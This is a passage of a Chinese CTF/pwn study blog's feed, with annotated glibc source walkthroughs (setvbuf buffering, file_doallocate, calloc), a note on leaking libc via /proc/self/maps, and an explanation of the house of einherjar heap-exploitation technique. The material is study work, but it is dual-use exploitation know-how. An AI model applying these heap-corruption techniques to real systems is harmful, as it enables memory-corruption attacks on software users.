_IO_LINE_BUF is off.  If this is a tty, and</span></span><br><span class="line"><span class="comment"> _IO_filedoalloc later gets called, it cannot know if</span></span><br><span class="line"><span class="comment"> it should set the _IO_LINE_BUF flag (because that is</span></span><br><span class="line"><span class="comment"> the default), or not (because we have explicitly asked</span></span><br><span class="line"><span class="comment"> for fully buffered mode).  So we make sure a buffer</span></span><br><span class="line"><span class="comment"> gets allocated now, and explicitly turn off line</span></span><br><span class="line"><span class="comment"> buffering.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A possibly cleaner alternative would be to add an</span></span><br><span class="line"><span class="comment"> extra flag, but then flags are a finite resource.  */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_DOALLOCATE (fp) &lt; <span class="number">0</span>)<span class="comment">//为其分配一块内存</span></span><br><span class="line">&#123;</span><br><span class="line">  result = EOF;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//因为缓存分配函数默认会将行缓冲标志设为1,再次清空,可以看一下上面一大段英文</span></span><br><span class="line">    &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IOLBF:</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;<span class="comment">//清空无缓冲标志</span></span><br><span class="line">      fp-&gt;_flags |= _IO_LINE_BUF;<span class="comment">//设置行缓冲模式</span></span><br><span class="line">      <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IONBF:</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//设置无缓冲标志</span></span><br><span class="line">      fp-&gt;_flags |= _IO_UNBUFFERED;<span class="comment">//清空行缓冲模式</span></span><br><span class="line">      buf = <span class="literal">NULL</span>;</span><br><span class="line">      size = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = EOF;</span><br><span class="line">      <span class="keyword">goto</span> unlock_return;</span><br><span class="line">    &#125;</span><br><span class="line">  result = _IO_SETBUF (fp, buf, size) == <span class="literal">NULL</span> ? EOF : <span class="number">0</span>;<span class="comment">//设置buf</span></span><br><span class="line"></span><br><span class="line">unlock_return:</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x1-IOFBF"><a href="#0x1-IOFBF" class="headerlink" title="0x1_IOFBF"></a>0x1_IOFBF</h2><ul><li>首先将_IO_LINE_BUF 和_IO_UNBUFFERED 位置为 0，因为目前是要求 full buffering 的；</li><li>然后我们检查输入参数 buf，如果为空的话，我们要尝试进行分配 buffer 分配；</li><li>再次我们检查 fp-&gt;_IO_buf_base 参数，这里指向的是 fp 预先分配的缓存 buffer，只有这里也为空，那就说明完全没有缓存 buffer 可用，那我们就真的需要进行分配了；</li><li>调用_IO_DOALLOCATE 对 fp 进行 buffer 分配</li><li>根据分配 buffer 是否失败决定是直接返回错误 EOF，还是重新只将_IO_LINE_BUF 置为 0</li><li><strong>注意了，上面都是 buf 为空，需要重新</strong></li><li><strong>分配的情况，如果 buf 不为空，那么我们会跳到</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _IO_SETBUF (fp, buf, size) == NULL ? EOF : 0;</span><br></pre></td></tr></table></figure><p><strong>的执行中，进行 buf 设置；如果 fp-&gt;_IO_buf_base 不等于 NULL，那我们实际上是默认使用这块 buffer 的，返回 0，退出函数</strong></p><p>看一下其中的doalloc函数,位于libio/filedoallocate.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;<span class="comment">//默认size</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;<span class="comment">//设置行缓冲</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);<span class="comment">//申请</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);<span class="comment">//设置缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>这个函数的核心作用就是为 fp-&gt;_IO_buf_base 分配一块合理大小的 buffer 用作缓存，我们来看看它的一些具体逻辑：</p><ul><li>默认 size 大小是 size = BUFSIZ （8192 字节）</li><li>对 fp 指针状态进行设置，将_IO_LINE_BUF 置位；</li><li>通过获取该 IO 流的 stat 信息 st，决定是否有必要采用其中 st_blksize 更新 size(主要是考虑使用一个比 8192 更小的 size，分配足够的就行，不一定要最大的 size)</li><li>通过 malloc 分配对应大小的 buffer，然后调用_IO_setb 将 fp-&gt;_IO_buf_base 设置为刚才申请的地址</li></ul><h2 id="0x2-IOLBF"><a href="#0x2-IOLBF" class="headerlink" title="0x2_IOLBF"></a>0x2_IOLBF</h2><p>这种情况是按行使用 buffer，主要做了以下操作：</p><ul><li>设置 tag，将_IO_UNBUFFERED 置 0，将_IO_LINE_BUF 置位；</li><li>如果入参 buf 为空，那就直接返回 0，结束函数；否则等待执行_IO_SETBUF (fp, buf, size)</li></ul><p><strong>思考：这里为什么不重新检查 fp-&gt;_IO_buf_base 然后分配内存呢？</strong></p><p>从上一种情况中我们注意到，在分配 buffer 后我们都默认将_IO_LINE_BUF 置位，即这是一种默认模式，所以我们无需检查 fp-&gt;_IO_buf_base 的状态</p><h2 id="0x3-IONBUF"><a href="#0x3-IONBUF" class="headerlink" title="0x3_IONBUF"></a>0x3_IONBUF</h2><p>这种情况的操作就更为简单了，禁用了 buffer，我们将_IO_LINE_BUF 置 0，_IO_UNBUFFERED 置位，然后将入参 buf 置为 NULL，size 置为 0，等待调用_IO_SETBUF (fp, buf, size)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> _IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux杂烩</title>
      <link href="/posts/25867/"/>
      <url>/posts/25867/</url>
      
        <content type="html"><![CDATA[<p><strong>记一些做题过程中遇到的linux知识</strong></p><h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><p>在Linux系统中，/proc目录是一个虚拟文件系统，用于提供有关当前运行中的内核和系统状态的信息。它不包含实际的文件，而是包含一组伪文件和子目录，这些文件和目录提供了有关系统内核、进程、硬件和其他系统信息的实时视图。</p><p>以下是/proc目录的一些常见用途和子目录：</p><ol><li><strong>/proc/cpuinfo</strong>: 包含有关CPU的信息，如制造商、型号、时钟频率等。</li><li><strong>/proc/meminfo</strong>: 提供系统内存使用的信息，包括总内存、可用内存、缓存等。</li><li><strong>/proc/sys</strong>: 包含用于配置内核参数的文件。可以通过这些文件来动态更改内核的某些行为。</li><li><strong>/proc/<PID></strong>: 每个正在运行的进程都有一个以其进程ID（PID）命名的子目录，其中包含有关该进程的信息，如命令行参数、状态、打开的文件描述符等。</li><li><strong>/proc/net</strong>: 包含有关网络协议、接口和连接的信息。</li><li><strong>/proc/loadavg</strong>: 提供系统的负载平均值，以及最近1分钟、5分钟和15分钟的负载平均值。</li><li><strong>/proc/filesystems</strong>: 列出支持的文件系统类型。</li><li><strong>/proc/interrupts</strong>: 显示当前系统上的中断分配情况，可以用于监视硬件中断的使用情况。</li><li><strong>/proc/mounts</strong>: 列出当前已挂载的文件系统。</li><li><strong>/proc/sys/kernel</strong>: 包含与内核相关的参数，如主机名、域名、内核版本等。</li><li><strong>/proc/sys/fs</strong>: 包含与文件系统相关的参数，如文件句柄限制等。</li></ol><p>这些信息对于系统管理、性能调优和故障排除非常有用，管理员和开发人员可以通过读取/proc目录中的文件来了解系统的运行状况和性能指标。需要注意的是，/proc目录中的信息是动态的，可以在运行时获取，因此可以用于实时监控系统状态。</p><p><strong>其中</strong></p><p>进程的内存信息都会存储于/proc/pid/maps中，</p><p>如果不知道pid,这里pid可以使用self来代替，就能获取本进程libc的地址了。</p>]]></content>
      
      
      <categories>
          
          <category> -杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 杂烩 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>calloc函数学习</title>
      <link href="/posts/14246/"/>
      <url>/posts/14246/</url>
      
        <content type="html"><![CDATA[<h1 id="calloc源码"><a href="#calloc源码" class="headerlink" title="calloc源码"></a>calloc源码</h1><p>原型__libc_calloc (size_t n, size_t elem_size)</p><p>开始声明了一堆变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mstate av;</span><br><span class="line">mchunkptr oldtop, p;</span><br><span class="line">INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;</span><br><span class="line"><span class="type">void</span> *mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> clearsize;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nclears;</span><br><span class="line">INTERNAL_SIZE_T *d;</span><br></pre></td></tr></table></figure><p>得到申请大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes = n * elem_size;</span><br></pre></td></tr></table></figure><p>大小检测??</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_INTERNAL_SIZE_T \</span></span><br><span class="line"><span class="meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (elem_size != <span class="number">0</span> &amp;&amp; bytes / elem_size != n)</span><br><span class="line">        &#123;</span><br><span class="line">          __set_errno (ENOMEM);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>hook</strong>,定义一个函数指针,值来自__malloc_hook,不为空则调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">  atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    sz = bytes;</span><br><span class="line">    mem = (*hook)(sz, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一些准备工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  sz = bytes;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    av = &amp;main_arena;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    arena_get (av, sz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check if we hand out the top chunk, in which case there may be no</span></span><br><span class="line"><span class="comment"> need to clear. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">      oldtop = top (av);</span><br><span class="line">      oldtopsize = chunksize (top (av));</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> MORECORE_CLEARS &lt; 2</span></span><br><span class="line">      <span class="comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena &amp;&amp;</span><br><span class="line">  oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop)</span><br><span class="line">oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">&#123;</span><br><span class="line">  heap_info *heap = heap_for_ptr (oldtop);</span><br><span class="line">  <span class="keyword">if</span> (oldtopsize &lt; (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop)</span><br><span class="line">    oldtopsize = (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No usable arenas.  */</span></span><br><span class="line">      oldtop = <span class="number">0</span>;</span><br><span class="line">      oldtopsize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>核心依然是__int_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">        av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure><p>非单线程情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!SINGLE_THREAD_P)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (mem == <span class="number">0</span> &amp;&amp; av != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_calloc_retry, <span class="number">1</span>, sz);</span><br><span class="line">  av = arena_get_retry (av, sz);</span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (av != <span class="literal">NULL</span>)</span><br><span class="line">__libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>分配失败</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocation failed even after a retry.  */</span></span><br><span class="line"> <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>成功之后,如果是mmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two optional cases in which clearing not necessary */</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>不然,chunk置零并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  csz = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">  <span class="keyword">if</span> (perturb_byte == <span class="number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* clear only the bytes from non-freshly-sbrked memory */</span></span><br><span class="line">      csz = oldtopsize;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span></span><br><span class="line"><span class="comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span></span><br><span class="line"><span class="comment">     minimally 3.  */</span></span><br><span class="line">  d = (INTERNAL_SIZE_T *) mem;</span><br><span class="line">  clearsize = csz - SIZE_SZ;</span><br><span class="line">  nclears = clearsize / <span class="keyword">sizeof</span> (INTERNAL_SIZE_T);</span><br><span class="line">  assert (nclears &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nclears &gt; <span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (d, <span class="number">0</span>, clearsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(d + <span class="number">0</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *(d + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (nclears &gt; <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          *(d + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">          *(d + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (nclears &gt; <span class="number">6</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">              *(d + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> (nclears &gt; <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  *(d + <span class="number">7</span>) = <span class="number">0</span>;</span><br><span class="line">                  *(d + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="异同"><a href="#异同" class="headerlink" title="异同"></a>异同</h1><p>calloc与malloc的核心都是__int_malloc</p><p>而这其实并没有什么太大的差别</p><p>比较大的不同两点:</p><ol><li><strong>calloc会将返回的chunk的mem全部置零</strong></li><li><strong>__libc_calloc函数并不使用tcache</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> calloc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap</title>
      <link href="/posts/49295/"/>
      <url>/posts/49295/</url>
      
        <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（<strong>合并低地址的 chunk</strong>），从而使得尽可能避免碎片化。</p><p><strong>利用条件:</strong>off-by-one(可写下一chunk的prev_size与prev_inuse位)</p><p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk(要可写,因此大多还是位于堆上)</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>free函数向低地址chunk合并的操作如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设在内存由低到高有A与B两个chunk</p><p>且A能够改写B的prev_size与prev_inuse位</p><p><strong>unlink的chunk地址由以下代码决定</strong></p><p><code>p = chunk_at_offset(p, -((long) prevsize));</code></p><p>因为prevsize(<strong>有符号数</strong>)也是可控的</p><p>因此只需要在目标地址伪造fakechunk绕过unlink的检查即可</p><p><strong>完整性检查</strong>:难以找到存储&amp;A的内存,故选择fakechunk-&gt;fd=fakechunk-&gt;bk=fakechunk</p><p><strong>size检查:</strong>通过fakechunk的size字段找到的nextchunk的prev_size字段是否等于fakechunk的size</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png" alt=""></p><h2 id="2-29新限制"><a href="#2-29新限制" class="headerlink" title="2.29新限制"></a>2.29新限制</h2><p>2.29向低地址合并操作代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现多了一个检测(通过prevsize找到的chunk的size<strong>?=</strong>prevsize)</p><p>这就使得fakechunk的size必须和prevsize相同,而这样的话fakechunk的nextchunk必然还是原本的chunk</p><p>因此,2.29及以后fakechunk的size字段必须和本chunk的prevsize相同</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 Seccon tinypad</strong></p><h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h1 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h1><h1 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h1><h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h1 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h1><h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h1><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of 